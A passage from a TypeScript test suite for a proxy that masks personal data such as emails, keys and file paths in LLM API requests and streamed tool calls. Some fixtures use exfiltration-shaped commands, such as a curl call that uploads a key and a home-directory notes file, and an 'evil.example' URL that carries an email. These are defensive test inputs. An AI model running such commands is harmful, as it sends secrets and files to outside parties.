    const body = await (await post('/v1/chat/completions', { model: 'm', messages: [userRequest] })).json() as any
    for (const call of body.choices[0].message.tool_calls) {
      expect(JSON.parse(call.function.arguments).command).toMatch(new RegExp(`^curl -d ⟦KEY_\\d+⟧ -F to=${EMAIL.replaceAll('.', '\\.')} -F f=@⟦PATH_\\d+⟧/notes\\.md$`))
    }
  })

  it('applies the default policy to Anthropic input_json_delta events without a content_block_start', async () => {
    reply = entry => ({
      sse: sse([
        ['message_start', { type: 'message_start', message: { id: 'm', role: 'assistant', content: [] } }],
        // Ends inside a held placeholder prefix, so the stop event's tail must be tool input too.
        ...chunk(`${command(entry)} ${id(entry, 'KEY')}`.slice(0, -2), 2).map((part): [string, unknown] => ['content_block_delta', { type: 'content_block_delta', index: 0, delta: { type: 'input_json_delta', partial_json: part } }]),
        ['content_block_stop', { type: 'content_block_stop', index: 0 }],
        ['message_stop', { type: 'message_stop' }],
      ]),
    })
    const text = await (await post('/v1/messages', { model: 'c', max_tokens: 1, stream: true, messages: [userRequest] }, { 'x-api-key': 'k' })).text()
    const deltas = events(text).filter(e => e.type === 'content_block_delta').map(e => e.delta)
    expect(deltas.every(delta => delta.type === 'input_json_delta')).toBe(true)
    const partial = deltas.map(delta => delta.partial_json).join('')
    expect(JSON.parse(partial.slice(0, partial.lastIndexOf(' '))).command).toMatch(DEFAULT_KEPT)
  })

  it('applies the policy to streamed MCP arguments and custom tool input, and names an unnamed item by its type', async () => {
    reply = entry => {
      const delta = (type: string, item_id: string, part: string): [string, unknown] => [type, { type, item_id, output_index: 0, delta: part }]
      return {
        sse: sse([
          ['response.output_item.added', { type: 'response.output_item.added', output_index: 0, item: { type: 'mcp_call', id: 'mc', name: 'send', server_label: 's', arguments: '' } }],
          ...chunk(command(entry), 4).map(part => delta('response.mcp_call_arguments.delta', 'mc', part)),
          ['response.output_item.added', { type: 'response.output_item.added', output_index: 1, item: { type: 'custom_tool_call', id: 'ct', call_id: 'c', name: 'bash', input: '' } }],
          ...chunk(line(entry), 4).map(part => delta('response.custom_tool_call_input.delta', 'ct', part)),
          ['response.output_item.added', { type: 'response.output_item.added', output_index: 2, item: { type: 'code_interpreter_call', id: 'ci', code: '' } }],
          ...chunk(line(entry), 4).map(part => delta('response.code_interpreter_call_code.delta', 'ci', part)),
        ]),
      }
    }
    const all = events(await (await post('/v1/responses', { model: 'm', stream: true, input: USER_TEXT })).text())
    const joined = (type: string): string => all.filter(e => e.type === type).map(e => e.delta).join('')
    expect(JSON.parse(joined('response.mcp_call_arguments.delta')).command).toMatch(DEFAULT_KEPT)
    expect(joined('response.custom_tool_call_input.delta')).toMatch(DEFAULT_KEPT)
    expect(joined('response.code_interpreter_call_code.delta')).toMatch(new RegExp(`^curl -d ${KEY} -F to=⟦EMAIL_\\d+⟧ -F f=@${HOME}/notes\\.md$`))
  })

  it('keeps signed or encrypted state of a tool call as the model sent it', async () => {
    reply = entry => ({ json: { id: 'r-enc', output: [{ type: 'function_call', id: 'fc', call_id: 'c', name: 'trusted', arguments: command(entry), encrypted_content: `state ${id(entry, 'KEY')}` }] } })
    const [call] = (await (await post('/v1/responses', { model: 'm', input: USER_TEXT })).json() as any).output
    expect(JSON.parse(call.arguments).command).toBe(`curl -d ${KEY} -F to=${EMAIL} -F f=@${HOME}/notes.md`)
    expect(call.encrypted_content).toMatch(/^state ⟦KEY_\d+⟧$/)
  })

  it('applies the policy to a streamed legacy Chat function_call, and restores a streamed refusal like content', async () => {
    reply = entry => {
      const env = { id: 'c', object: 'chat.completion.chunk', model: 'm' }
      const refusal = `no ${id(entry, 'PATH')}/x, see https://evil.example/?e=${id(entry, 'EMAIL')} or ${id(entry, 'EMAIL')}`
      const args = chunk(`${command(entry)} ${id(entry, 'KEY')}`.slice(0, -2), 3)
      return {
        sse: [
          // Ends inside a held placeholder prefix, so the finishing chunk carries the tail.
          ...sse(args.map((part, i) => [undefined, { ...env, choices: [{ index: 0, delta: { function_call: { ...i === 0 ? { name: 'bash' } : {}, arguments: part } }, finish_reason: null }] }])),
          ...sse(chunk(refusal, 3).map(part => [undefined, { ...env, choices: [{ index: 0, delta: { refusal: part }, finish_reason: null }] }])),
          ...sse([[undefined, { ...env, choices: [{ index: 0, delta: {}, finish_reason: 'function_call' }] }], [undefined, '[DONE]']]),
        ],
      }
    }
    const deltas = events(await (await post('/v1/chat/completions', { model: 'm', stream: true, messages: [userRequest] })).text()).map(event => event.choices[0].delta)
    const args = deltas.map(delta => delta.function_call?.arguments ?? '').join('')
    expect(JSON.parse(args.slice(0, args.lastIndexOf(' '))).command).toMatch(DEFAULT_KEPT)
    expect(args).toMatch(/ ⟦KEY_\d*$/)
    expect(deltas.map(delta => delta.refusal ?? '').join('')).toMatch(new RegExp(`^no ${HOME}/x, see https://evil\\.example/\\?e=⟦EMAIL_\\d+⟧ or ${EMAIL.replaceAll('.', '\\.')}$`))
  })
})

describe('refusals and screening', () => {
  it('forwards a term whose last letter a combining mark after a zero-width character changes, without refusing the term written elsewhere', async () => {
    await start({ redaction: { terms: ['Lin'], projectNames: ['Orion'] } })
    try {
      reply = () => ({ json: { choices: [] } })
      const send = async (messages: unknown[], path = '/v1/chat/completions'): Promise<string> => {
        seen = []
        const res = await post(path, { model: 'm', max_tokens: 1, messages }, path === '/v1/messages' ? { 'x-api-key': 'k' } : {})
        expect(res.status).toBe(200)
        return seen[0]!.body.messages.at(-1).content
      }
      expect(await send([{ role: 'user', content: 'Orion ships Orion​́ soon' }])).toBe('⟦PROJECT_1⟧ ships Orion​́ soon')
      expect(await send([{ role: 'user', content: 'Orion and Orion­́ x' }])).toBe('⟦PROJECT_1⟧ and Orion­́ x')
      const history = [{ role: 'user', content: 'read the doc' }, { role: 'assistant', tool_calls: [{ id: 'c', type: 'function', function: { name: 'read', arguments: '{}' } }] }, { role: 'tool', tool_call_id: 'c', content: 'Project Orion​́ roadmap' }]
      for (let turn = 1; turn <= 3; turn += 1) {
        expect(await send([...history, { role: 'user', content: `summarize Orion for me (turn ${turn})` }])).toBe(`summarize ⟦PROJECT_1⟧ for me (turn ${turn})`)
      }
      expect(await send([{ role: 'user', content: 'Lin and Lin⁠̈' }], '/v1/messages')).toMatch(/^⟦TERM_1⟧ and ⟦TERM_\d⟧$/)
    } finally {
      await start()
    }
  })

  it('refuses an unknown POST route without forwarding it', async () => {
    const res = await post('/v1/embeddings', { input: EMAIL })
    expect(res.status).toBe(404)
    expect(seen).toHaveLength(0)
  })

  it('relays GET requests unchanged', async () => {
    reply = () => ({ json: { data: [{ id: 'm' }] } })
    const res = await fetch(`${base}/v1/models`, { headers: { authorization: 'Bearer k' } })
    expect(await res.json()).toEqual({ data: [{ id: 'm' }] })
    expect(seen[0]!.url).toBe('/v1/models')
  })

  it('refuses a request whose unrewritten fields still hold a detected value, naming only the field', async () => {
    const res = await post('/v1/chat/completions', { model: 'm', metadata: { owner: EMAIL }, messages: [{ role: 'user', content: `hi ${EMAIL}` }] })
    expect(res.status).toBe(422)
    const body = await res.text()
    expect(body).toContain('/metadata/owner')
    expect((await post('/v1/chat/completions', { model: 'm', stop: [EMAIL], messages: [{ role: 'user', content: `hi ${EMAIL}` }] })).status).toBe(422)
    expect(body).not.toContain(EMAIL)
    expect(seen).toHaveLength(0)
  })

  it('refuses a rules value glued into a longer token or URL, and a one-character term', async () => {
    const glued = [
      { metadata: { ref: `X${TWID}` }, messages: [{ role: 'user', content: `id ${TWID}` }] },
      { messages: [{ role: 'user', content: `key ${KEY}` }, { role: 'user', content: [{ type: 'image_url', image_url: { url: `https://img.example.test/a?tok${KEY}` } }] }] },
      { messages: [{ role: 'user', content: `id ${TWID}` }, { role: 'tool', tool_call_id: 't', content: `ref${TWID}` }] },
    ]
    for (const body of glued) expect((await post('/v1/chat/completions', { model: 'm', ...body })).status).toBe(422)
    await start({ redaction: { terms: ['Q'] } })
    try {
      const res = await post('/v1/chat/completions', { model: 'm', metadata: { tag: 'Q' }, messages: [{ role: 'user', content: 'project Q is late' }] })
      expect(res.status).toBe(422)
      expect(seen).toHaveLength(0)
    } finally {
      await start()
    }
  })

  it('refuses a request from a browser origin or for a rebound host name, without forwarding it', async () => {
    const send = (headers: Record<string, string>): Promise<number> => new Promise((resolve, reject) => {
      const body = JSON.stringify({ model: 'm', messages: [{ role: 'user', content: 'hi' }] })
      const req = request(`${base}/v1/chat/completions`, { method: 'POST', headers: { 'content-type': 'text/plain', ...headers } }, res => {
        res.resume()
        resolve(res.statusCode ?? 0)
      })
      req.on('error', reject)
      req.end(body)
    })
    reply = () => ({ json: { choices: [] } })
    expect(await send({ origin: 'https://evil.example' })).toBe(403)
    expect(await send({ origin: 'null' })).toBe(403)
    expect(await send({ host: 'rebound.example:8787' })).toBe(403)
    expect(seen).toHaveLength(0)
    expect(await send({ origin: 'http://localhost:3000' })).toBe(200)
    expect(await send({ host: 'localhost:8787' })).toBe(200)
  })

  it('refuses a body over the size limit without forwarding it', async () => {
    const res = await fetch(`${base}/v1/chat/completions`, { method: 'POST', body: Buffer.alloc(64 * 1024 * 1024 + 1, 32) })
    expect(res.status).toBe(413)
    expect(seen).toHaveLength(0)
  })

  it('refuses a continuation whose earlier texts it does not hold', async () => {
    const res = await post('/v1/responses', { model: 'm', previous_response_id: 'resp_unknown', input: `mail ${EMAIL}` })
    expect(res.status).toBe(422)
    expect(seen).toHaveLength(0)
  })

  it('names a key that holds a detected value as <key>, in the reply and the log', async () => {
    const res = await post('/v1/chat/completions', { model: 'm', metadata: { [EMAIL]: { note: EMAIL } }, messages: [{ role: 'user', content: `hi ${EMAIL}` }] })
    expect(res.status).toBe(422)
    const body = await res.text()
    expect(body).toContain('/metadata/<key>')
    expect(body).not.toContain(EMAIL)
    expect(logs.join('\n')).not.toContain(EMAIL)
  })

  it('names an array index in a refusal as the index', async () => {
    const res = await post('/v1/chat/completions', { model: 'm', messages: [{ role: 'user', content: `id ${TWID}` }, { role: 'tool', tool_call_id: 't', content: `ref${TWID}` }] })
    expect(res.status).toBe(422)
    expect(await res.text()).toContain('/messages/1/content')
  })

  it('refuses an ASCII case variant of a detected value, but not ordinary text beside it', async () => {
    reply = () => ({ json: { choices: [] } })
    const variant = await post('/v1/chat/completions', { model: 'm', metadata: { owner: EMAIL.toUpperCase() }, messages: [{ role: 'user', content: `hi ${EMAIL}` }] })
    expect(variant.status).toBe(422)
    expect(seen).toHaveLength(0)
    const ordinary = await post('/v1/chat/completions', { model: 'm', metadata: { topic: 'Example Test notes' }, messages: [{ role: 'user', content: `hi ${EMAIL}, see the Example.Test docs` }] })
    expect(ordinary.status).toBe(200)
  })

  it('refuses a detected value written JSON-escaped in a field it does not rewrite', async () => {
    const res = await post('/v1/chat/completions', { model: 'm', metadata: { args: JSON.stringify({ p: QUOTED }) }, messages: [{ role: 'user', content: USER_TEXT }] })
    expect(res.status).toBe(422)
    expect(seen).toHaveLength(0)
  })

  it('counts a configured term as a leak only where it stands alone, in any ASCII case', async () => {
    await start({ redaction: { terms: ['Hsin', 'Lin'] } })
    try {
      const send = (metadata: Record<string, string>) => post('/v1/chat/completions', { model: 'm', metadata, messages: [{ role: 'user', content: 'Hsin lives in Hsinchu, online' }] })
      const res = await send({ note: 'Hsinchu, Linux' })
      expect(res.status).toBe(200)
      expect(seen[0]!.body.messages[0].content).toMatch(/^⟦TERM_\d+⟧ lives in /)
      expect(seen[0]!.body.metadata.note).toBe('Hsinchu, Linux')
      expect((await send({ note: 'met HSIN' })).status).toBe(422)
    } finally {
      await start()
    }
  })

  it('refuses a value that ends inside a longer overlapping value', async () => {
    await start({ redaction: { terms: ['ab', '-abc'] } })
    try {
      const res = await post('/v1/chat/completions', { model: 'm', metadata: { tag: '-ab' }, messages: [{ role: 'user', content: 'ab and -abc' }] })
      expect(res.status).toBe(422)
      expect(seen).toHaveLength(0)
    } finally {
      await start()
    }
  })

  it('checks thousands of distinct values for leaks in one pass', async () => {
    reply = () => ({ json: { choices: [] } })
    const messages = Array.from({ length: 16_000 }, (_, i) => ({ role: 'user', content: `u${i}.fictional@example.test` }))
    const started = process.cpuUsage()
    expect((await post('/v1/chat/completions', { model: 'm', messages })).status).toBe(200)
    const used = process.cpuUsage(started)
    expect((used.user + used.system) / 1_000).toBeLessThan(2_000)
  })

  it('replaces control characters and stray delimiters by default, and refuses them on request', async () => {
    reply = () => ({ json: { choices: [] } })
    await post('/v1/chat/completions', { model: 'm', messages: [{ role: 'user', content: `\u001b[31mred\u001b[0m ⟦EMAIL_9⟧ ${EMAIL}` }] })
    expect(seen[0]!.body.messages[0].content).toBe('␛[31mred␛[0m ⟪EMAIL_9⟫ ⟦EMAIL_1⟧')
    await start({ screen: 'refuse' })
    try {
      const res = await post('/v1/chat/completions', { model: 'm', messages: [{ role: 'user', content: '\u001b[31m' }] })
      expect(res.status).toBe(422)
      expect(await res.text()).toContain('/messages/0/content')
      expect(seen).toHaveLength(1)
    } finally {
      await start()
    }
  })
})

describe('upstream failures', () => {
  it('refuses an upstream redirect with 502 instead of following it with the client credential', async () => {
    const landed: IncomingHttpHeaders[] = []
    const other = createServer((req, res) => {
      landed.push(req.headers)
      req.resume()
      res.end('{}')
    })
    await new Promise<void>(resolve => other.listen(0, '127.0.0.1', resolve))
    try {
      const location = `http://127.0.0.1:${(other.address() as { port: number }).port}/landed`
      for (const status of [302, 307, 308]) {
        reply = () => ({ status, headers: { location }, json: {} })
        const res = await post('/v1/messages', { model: 'c', max_tokens: 1, messages: [{ role: 'user', content: `mail ${EMAIL}` }] }, { 'x-api-key': 'sk-ant-fictional' })
        expect(res.status).toBe(502)
        expect(await res.text()).toContain('redirect')
      }
      expect((await fetch(`${base}/v1/models`, { headers: { authorization: 'Bearer k' } })).status).toBe(502)
      expect(landed).toHaveLength(0)
      expect(logs.filter(line => line.includes('-> 502'))).toHaveLength(4)
    } finally {
      await new Promise(resolve => other.close(resolve))
    }
  })

  it('relays a 304 to a GET unchanged', async () => {
    reply = () => ({ status: 304 })
    expect((await fetch(`${base}/v1/models`, { headers: { authorization: 'Bearer k' } })).status).toBe(304)
  })

  it('sends a held tail when the upstream stream ends without a finish event', async () => {
    reply = () => ({ sse: sse([[undefined, { id: 'c1', choices: [{ index: 0, delta: { content: 'hello ⟦EM' }, finish_reason: null }] }]]) })
    const chat = events(await (await post('/v1/chat/completions', { model: 'm', stream: true, messages: [{ role: 'user', content: 'hi' }] })).text())
    expect(chat.map(event => event.choices[0].delta.content).join('')).toBe('hello ⟦EM')
    expect(chat.at(-1).id).toBe('c1')

    reply = () => ({ sse: sse([
      ['content_block_start', { type: 'content_block_start', index: 0, content_block: { type: 'text', text: '' } }],
      ['content_block_delta', { type: 'content_block_delta', index: 0, delta: { type: 'text_delta', text: 'hello ⟦EM' } }],
    ]) })
    const messages = events(await (await post('/v1/messages', { model: 'c', max_tokens: 1, stream: true, messages: [{ role: 'user', content: 'hi' }] }, { 'x-api-key': 'k' })).text())
    expect(messages.filter(event => event.type === 'content_block_delta').map(event => event.delta.text).join('')).toBe('hello ⟦EM')

    reply = () => ({ sse: sse([['response.output_text.delta', { type: 'response.output_text.delta', item_id: 'i1', output_index: 0, content_index: 0, delta: 'hello ⟦EM' }]]) })
    const responses = events(await (await post('/v1/responses', { model: 'm', stream: true, input: 'hi' })).text())
    expect(responses.map(event => event.delta).join('')).toBe('hello ⟦EM')
    expect(responses.at(-1)).toMatchObject({ type: 'response.output_text.delta', item_id: 'i1', content_index: 0 })
  })

  it('passes malformed stream events through and keeps restoring the rest', async () => {
    reply = entry => ({ sse: sse([
      [undefined, { choices: [null] }],
      [undefined, { choices: 'x' }],
      [undefined, { choices: [{ index: 0, delta: { tool_calls: [null, 'y'] } }] }],
      [undefined, { choices: [{ index: 0, delta: 'z', finish_reason: 'stop' }] }],
      [undefined, { choices: [{ index: 1, delta: { content: `to ${placeholders(entry.raw)[0]}` }, finish_reason: 'stop' }] }],
      [undefined, '[DONE]'],
    ]) })
    const res = await post('/v1/chat/completions', { model: 'm', stream: true, messages: [{ role: 'user', content: `mail ${EMAIL}` }] })
    const text = await res.text()
    expect(text).toContain('{"choices":[null]}')
    expect(text).toContain('{"choices":"x"}')
    expect(text).toContain(`to ${EMAIL}`)
    expect(text).toContain('data: [DONE]')
    expect(logs.some(line => line.startsWith('POST /v1/chat/completions -> 200 masked 1'))).toBe(true)
  })

  it('flushes a held tool-call tail into a finishing chunk whose tool_calls is malformed', async () => {
    for (const malformed of [[null], {}, 'x']) {
      reply = entry => {
        const held = placeholders(entry.raw)[0]!.slice(0, -2)
        return { sse: sse([
          [undefined, { choices: [{ index: 0, delta: { tool_calls: [{ index: 0, id: 'c1', type: 'function', function: { name: 'bash', arguments: `{"cmd":"echo ${held}` } }] } }] }],
          [undefined, { choices: [{ index: 0, delta: { tool_calls: malformed }, finish_reason: 'tool_calls' }] }],
          [undefined, '[DONE]'],
        ]) }
      }
      const res = await post('/v1/chat/completions', { model: 'm', stream: true, messages: [{ role: 'user', content: `mail ${EMAIL}` }] })
      const text = await res.text()
      expect(text).toContain('⟦EMAIL_')
      expect(text).toContain('data: [DONE]')
      expect(logs.at(-1)).toMatch(/^POST \/v1\/chat\/completions -> 200 /)
    }
  })

  it('logs a stream the client abandons', async () => {
    const hung = createServer((req, res) => {
      req.resume()
      res.writeHead(200, { 'content-type': 'text/event-stream' })
      res.write(`data: ${JSON.stringify({ choices: [{ index: 0, delta: { content: 'a' } }] })}\n\n`)
    })
    await new Promise<void>(resolve => hung.listen(0, '127.0.0.1', resolve))
    try {
      await start({ openaiUpstream: `http://127.0.0.1:${(hung.address() as { port: number }).port}` })
      await new Promise<void>((resolve, reject) => {
        const req = request(`${base}/v1/chat/completions`, { method: 'POST', headers: { 'content-type': 'application/json' } }, res => {
          res.once('data', () => req.destroy())
          res.on('close', resolve)
        })
        req.on('error', () => {})
        req.on('close', resolve)
        req.end(JSON.stringify({ model: 'm', stream: true, messages: [{ role: 'user', content: 'hi' }] }))
        setTimeout(reject, 5_000)
      })
      await vi.waitFor(() => expect(logs).toContain('POST /v1/chat/completions -> 200 aborted by the client'))
    } finally {
      hung.closeAllConnections()
      await new Promise(resolve => hung.close(resolve))
      await start()
    }
  })

  it('refuses a body nested too deeply to mask, without forwarding it', async () => {
    const depth = 200_000
    const res = await fetch(`${base}/v1/chat/completions`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: `{"model":"m","messages":${'['.repeat(depth)}${']'.repeat(depth)}}` })
    expect(res.status).toBe(400)
    expect(await res.text()).toContain('nested too deeply')
    expect(seen).toHaveLength(0)
  })
})

describe('placeholders kept in tool calls and resent', () => {
  // The default policy keeps EMAIL and TWID in tool arguments, so the client receives `⟦EMAIL_1⟧` and sends it back.
  beforeAll(() => start({ toolRestore: { categories: DEFAULT_TOOL_RESTORE_CATEGORIES, tools: new Map() } }))
  afterAll(() => start())

  const OTHER = 'second.fictional@example.test'
  const ASK = `Run: echo mail ${EMAIL} id ${TWID} path ${HOME}/notes.md`
  const id = (entry: Seen, category: string): string => placeholders(entry.raw).find(found => found.startsWith(`⟦${category}_`))!
  const echo = (entry: Seen): string => `echo mail ${id(entry, 'EMAIL')} id ${id(entry, 'TWID')} path ${id(entry, 'PATH')}/notes.md`
  let credential = 0
  const fresh = (): Record<string, string> => ({ 'x-api-key': `kept-client-${credential += 1}`, authorization: `Bearer kept-client-${credential}` })

  it('resends an Anthropic conversation byte for byte, the kept placeholder as written, with stable numbers', async () => {
    const headers = fresh()
    reply = entry => ({ json: { id: 'm', type: 'message', role: 'assistant', content: [{ type: 'tool_use', id: 'tu1', name: 'Bash', input: { command: echo(entry) } }] } })
    const first = await (await post('/v1/messages', { model: 'c', max_tokens: 1, messages: [{ role: 'user', content: ASK }] }, headers)).json() as any
    const input = first.content[0].input
    expect(input.command).toBe(`echo mail ⟦EMAIL_1⟧ id ⟦TWID_1⟧ path ${HOME}/notes.md`)

    const turn2 = [
      { role: 'user', content: ASK },
      { role: 'assistant', content: [{ type: 'tool_use', id: 'tu1', name: 'Bash', input }] },
      { role: 'user', content: [{ type: 'tool_result', tool_use_id: 'tu1', content: `mail ⟦EMAIL_1⟧ id ⟦TWID_1⟧ path ${HOME}/notes.md\nowner: ${OTHER}` }] },
    ]
    reply = () => ({ json: { id: 'm', type: 'message', role: 'assistant', content: [{ type: 'text', text: 'Mailed ⟦EMAIL_1⟧ and ⟦EMAIL_2⟧.' }] } })
    const second = await (await post('/v1/messages', { model: 'c', max_tokens: 1, messages: turn2 }, headers)).json() as any
    expect(second.content[0].text).toBe(`Mailed ${EMAIL} and ${OTHER}.`)
    const turn3 = [...turn2, { role: 'assistant', content: second.content }, { role: 'user', content: 'Thanks.' }]
    await post('/v1/messages', { model: 'c', max_tokens: 1, messages: turn3 }, headers)

    const [one, two, three] = seen
    expect(JSON.stringify(two!.body.messages[0])).toBe(JSON.stringify(one!.body.messages[0]))
    expect(two!.body.messages[1].content[0].input.command).toBe('echo mail ⟦EMAIL_1⟧ id ⟦TWID_1⟧ path ⟦PATH_1⟧/notes.md')
    expect(two!.body.messages[2].content[0].content).toBe('mail ⟦EMAIL_1⟧ id ⟦TWID_1⟧ path ⟦PATH_1⟧/notes.md\nowner: ⟦EMAIL_2⟧')
    expect(JSON.stringify(three!.body.messages.slice(0, 3))).toBe(JSON.stringify(two!.body.messages))
    for (const entry of seen) {
      expect(entry.raw).not.toContain('⟪')
      for (const original of [EMAIL, TWID, HOME, OTHER]) expect(entry.raw).not.toContain(original)
    }
  })

  it('resends a Chat Completions conversation byte for byte, the kept placeholder as written in arguments', async () => {
    const headers = fresh()
    const call = (args: string) => ({ id: 'call1', type: 'function', function: { name: 'bash', arguments: args } })
    reply = entry => ({ json: { choices: [{ index: 0, message: { role: 'assistant', content: null, tool_calls: [call(JSON.stringify({ command: echo(entry) }))] } }] } })
    const first = await (await post('/v1/chat/completions', { model: 'm', messages: [{ role: 'user', content: ASK }] }, headers)).json() as any
    const message = first.choices[0].message
    expect(JSON.parse(message.tool_calls[0].function.arguments).command).toBe(`echo mail ⟦EMAIL_1⟧ id ⟦TWID_1⟧ path ${HOME}/notes.md`)

    const turn2 = [
      { role: 'user', content: ASK },
      message,
      { role: 'tool', tool_call_id: 'call1', content: `mail ⟦EMAIL_1⟧ id ⟦TWID_1⟧\nowner: ${OTHER}` },
    ]
    reply = () => ({ json: { choices: [{ index: 0, message: { role: 'assistant', content: 'Done.' } }] } })
    await post('/v1/chat/completions', { model: 'm', messages: turn2 }, headers)
    await post('/v1/chat/completions', { model: 'm', messages: [...turn2, { role: 'assistant', content: 'Done.' }, { role: 'user', content: 'Thanks.' }] }, headers)

    const [one, two, three] = seen
    expect(JSON.stringify(two!.body.messages[0])).toBe(JSON.stringify(one!.body.messages[0]))
    expect(JSON.parse(two!.body.messages[1].tool_calls[0].function.arguments).command).toBe('echo mail ⟦EMAIL_1⟧ id ⟦TWID_1⟧ path ⟦PATH_1⟧/notes.md')
    expect(two!.body.messages[2].content).toBe('mail ⟦EMAIL_1⟧ id ⟦TWID_1⟧\nowner: ⟦EMAIL_2⟧')
    expect(JSON.stringify(three!.body.messages.slice(0, 3))).toBe(JSON.stringify(two!.body.messages))
  })

  it('restores the passed placeholder in a streamed reply and keeps it in streamed tool input', async () => {
    const headers = fresh()
    reply = entry => ({ json: { id: 'm', type: 'message', role: 'assistant', content: [{ type: 'tool_use', id: 'tu1', name: 'Bash', input: { command: echo(entry) } }] } })
    const first = await (await post('/v1/messages', { model: 'c', max_tokens: 1, messages: [{ role: 'user', content: ASK }] }, headers)).json() as any
    const input = first.content[0].input
    reply = () => ({
      sse: sse([
        ['message_start', { type: 'message_start', message: { id: 'm2', role: 'assistant', content: [], model: 'claude' } }],
        ['content_block_start', { type: 'content_block_start', index: 0, content_block: { type: 'text', text: '' } }],
        ...chunk('Again ⟦EMAIL_1⟧.').map((part): [string, unknown] => ['content_block_delta', { type: 'content_block_delta', index: 0, delta: { type: 'text_delta', text: part } }]),
        ['content_block_stop', { type: 'content_block_stop', index: 0 }],
        ['content_block_start', { type: 'content_block_start', index: 1, content_block: { type: 'tool_use', id: 'tu2', name: 'Bash', input: {} } }],
        ...chunk(JSON.stringify({ command: 'echo ⟦EMAIL_1⟧' }), 2).map((part): [string, unknown] => ['content_block_delta', { type: 'content_block_delta', index: 1, delta: { type: 'input_json_delta', partial_json: part } }]),
        ['content_block_stop', { type: 'content_block_stop', index: 1 }],
        ['message_stop', { type: 'message_stop' }],
      ]),
    })
    const messages = [
      { role: 'user', content: ASK },
      { role: 'assistant', content: [{ type: 'tool_use', id: 'tu1', name: 'Bash', input }] },
      { role: 'user', content: [{ type: 'tool_result', tool_use_id: 'tu1', content: 'mail ⟦EMAIL_1⟧' }] },
    ]
    const all = events(await (await post('/v1/messages', { model: 'c', max_tokens: 1, stream: true, messages }, headers)).text())
    expect(all.filter(e => e.delta?.type === 'text_delta').map(e => e.delta.text).join('')).toBe(`Again ${EMAIL}.`)
    expect(JSON.parse(all.filter(e => e.delta?.type === 'input_json_delta').map(e => e.delta.partial_json).join(''))).toEqual({ command: 'echo ⟦EMAIL_1⟧' })
  })

  it('keeps numbering across Responses continuations that resend a kept placeholder', async () => {
    const headers = fresh()
    reply = () => ({ json: { id: 'r1', output: [{ type: 'function_call', call_id: 'c', name: 'bash', arguments: JSON.stringify({ command: 'echo ⟦EMAIL_1⟧' }) }] } })
    const first = await (await post('/v1/responses', { model: 'm', input: `mail ${EMAIL}` }, headers)).json() as any
    expect(JSON.parse(first.output[0].arguments).command).toBe('echo ⟦EMAIL_1⟧')
    reply = () => ({ json: { id: 'r2', output: [] } })
    await post('/v1/responses', { model: 'm', previous_response_id: 'r1', input: [{ type: 'function_call_output', call_id: 'c', output: `⟦EMAIL_1⟧ and ${OTHER}` }] }, headers)
    reply = () => ({ json: { id: 'r3', output: [] } })
    await post('/v1/responses', { model: 'm', previous_response_id: 'r2', input: `more ${OTHER}` }, headers)
    expect(seen[1]!.body.input[0].output).toBe('⟦EMAIL_1⟧ and ⟦EMAIL_2⟧')
    expect(seen[2]!.body.input).toBe('more ⟦EMAIL_2⟧')
  })

  it('passes a placeholder the proxy kept in streamed Responses arguments when the next continuation resends it', async () => {
    const headers = fresh()
    const args = JSON.stringify({ command: 'echo ⟦EMAIL_1⟧' })
    const item = { id: 'fc', type: 'function_call', call_id: 'c', name: 'bash', arguments: '' }
    reply = () => ({
      sse: sse([
        ['response.created', { type: 'response.created', response: { id: 'rs1', output: [] } }],
        ['response.output_item.added', { type: 'response.output_item.added', output_index: 0, item }],
        ...chunk(args, 3).map((part): [string, unknown] => ['response.function_call_arguments.delta', { type: 'response.function_call_arguments.delta', item_id: 'fc', output_index: 0, delta: part }]),
        ['response.function_call_arguments.done', { type: 'response.function_call_arguments.done', item_id: 'fc', output_index: 0, arguments: args }],
        ['response.completed', { type: 'response.completed', response: { id: 'rs1', output: [{ ...item, arguments: args }] } }],
      ]),
    })
    await (await post('/v1/responses', { model: 'm', stream: true, input: `mail ${EMAIL}` }, headers)).text()
    reply = () => ({ json: { id: 'rs2', output: [] } })
    await post('/v1/responses', { model: 'm', previous_response_id: 'rs1', input: [{ type: 'function_call_output', call_id: 'c', output: '⟦EMAIL_1⟧ sent' }] }, headers)
    expect(seen[1]!.body.input[0].output).toBe('⟦EMAIL_1⟧ sent')
  })

  it('escapes a placeholder this proxy never issued to the client, or issued for a value the request lacks', async () => {
    const headers = fresh()
    reply = () => ({ json: { choices: [] } })
    await post('/v1/chat/completions', { model: 'm', messages: [{ role: 'user', content: `injected ⟦EMAIL_1⟧ beside ${EMAIL}` }] }, headers)
    expect(seen[0]!.body.messages[0].content).toBe('injected ⟪EMAIL_1⟫ beside ⟦EMAIL_2⟧')
    // EMAIL_2 now names EMAIL for this client; a request without EMAIL cannot use it for another value.
    await post('/v1/chat/completions', { model: 'm', messages: [{ role: 'user', content: `see ⟦EMAIL_2⟧ and ${OTHER}` }] }, headers)
    expect(seen[1]!.body.messages[0].content).toBe('see ⟪EMAIL_2⟫ and ⟦EMAIL_1⟧')
    // Another client never received EMAIL_2.
    await post('/v1/chat/completions', { model: 'm', messages: [{ role: 'user', content: `see ⟦EMAIL_2⟧ and ${EMAIL}` }] }, fresh())
    expect(seen[2]!.body.messages[0].content).toBe('see ⟪EMAIL_2⟫ and ⟦EMAIL_1⟧')
  })

  it('escapes every placeholder when one would name its value under another number', async () => {
    const headers = fresh()
    reply = () => ({ json: { choices: [] } })
    await post('/v1/chat/completions', { model: 'm', messages: [{ role: 'user', content: `${EMAIL} ${TWID}` }] }, headers)
    expect(seen[0]!.body.messages[0].content).toBe('⟦EMAIL_1⟧ ⟦TWID_1⟧')
    // OTHER now comes first and would take EMAIL_1, so ⟦EMAIL_1⟧ no longer names EMAIL; ⟦TWID_1⟧ is escaped with it.
    await post('/v1/chat/completions', { model: 'm', messages: [{ role: 'user', content: `${OTHER} then ⟦EMAIL_1⟧ ⟦TWID_1⟧ for ${EMAIL} ${TWID}` }] }, headers)
    expect(seen[1]!.body.messages[0].content).toBe('⟦EMAIL_2⟧ then ⟪EMAIL_1⟫ ⟪TWID_1⟫ for ⟦EMAIL_3⟧ ⟦TWID_2⟧')
  })

  it('escapes a resent placeholder whose number this client also gave another value, even when only that other value is present', async () => {
    const headers = fresh()
    reply = () => ({ json: { choices: [] } })
    // Two conversations of one client: EMAIL is EMAIL_1 in the first, OTHER is EMAIL_1 in the second.
    await post('/v1/chat/completions', { model: 'm', messages: [{ role: 'user', content: `mail ${EMAIL}` }] }, headers)
    await post('/v1/chat/completions', { model: 'm', messages: [{ role: 'user', content: `mail ${OTHER}` }] }, headers)
